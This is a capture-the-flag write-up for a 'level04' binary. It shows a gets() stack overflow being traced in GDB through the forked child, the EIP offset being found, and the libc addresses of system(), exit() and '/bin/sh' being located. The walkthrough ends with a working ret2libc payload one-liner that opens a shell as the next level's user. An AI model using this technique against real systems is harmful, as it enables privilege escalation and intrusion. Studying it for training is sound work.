# Level04

First step - testing the program

    $ ./level04 
    Give me some shellcode, k
    coucou
    child is exiting...

Start in GDB

The program do a fork and gets() in the child. In the parent, there is a check with ptrace and check if the child call the function exec?

    /*
    0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
    0x080487fd <+309>:	call   0x8048500 <puts@plt>
    */
    puts("no exec() for you");

 We can overflow the gets. Search the offset with my scripts

    (gdb)$ r
    Starting program: /home/users/level04/level04 
    Give me some shellcode, k
    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

The program stay in an infinite loop when segfault. We need to say to GDB to follow the child process

    (gdb) set follow-fork-mode child

    (gdb) r
    Starting program: /home/users/level04/level04 
    [New process 1739]
    Give me some shellcode, k
    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 1739]
    0x6e6e6e6e in ?? ()
    
    (gdb) i r
    eax            0x0	0
    ecx            0xf7fd08c4	-134412092
    edx            0xffffd590	-10864
    ebx            0x6b6b6b6b	1802201963
    esp            0xffffd630	0xffffd630
    ebp            0x6d6d6d6d	0x6d6d6d6d
    esi            0x0	0
    edi            0x6c6c6c6c	1819044972
    eip            0x6e6e6e6e	0x6e6e6e6e
    eflags         0x10286	[ PF SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

    ./get_offset.py 6e6e6e6e
    nnnn => offset = 156

We have EIP at the offset 156

Now try a ret2libc. Need the addresses of `system()`, `exit()` and a `"/bin/sh"` string

    (gdb) info function system
    ....
    0xf7e6aed0  system
    ....

    (gdb) info function exit
    ....
    0xf7e5eb70  exit
    ....

The address of `system` is `0xf7e6aed0`. `exit` is `0xf7e5eb70`

Now the `"/bin/sh"` string. Searching in the libc

    (gdb) info proc map
    process 1742
    Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
        0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
        0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

    (gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
    0xf7f897ec
    1 pattern found.

    (gdb) x/s 0xf7f897ec
    0xf7f897ec:	 "/bin/sh"

The address is `0xf7f897ec`

The address of `system` is `0xf7e6aed0`. `exit` is `0xf7e5eb70`

The payload will be :

    ("B" * 156) + system + exit + "/bin/sh"

Try :

    $ python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload
    
    $ cat /tmp/payload - | ./level04 
    Give me some shellcode, k
    whoami
    level05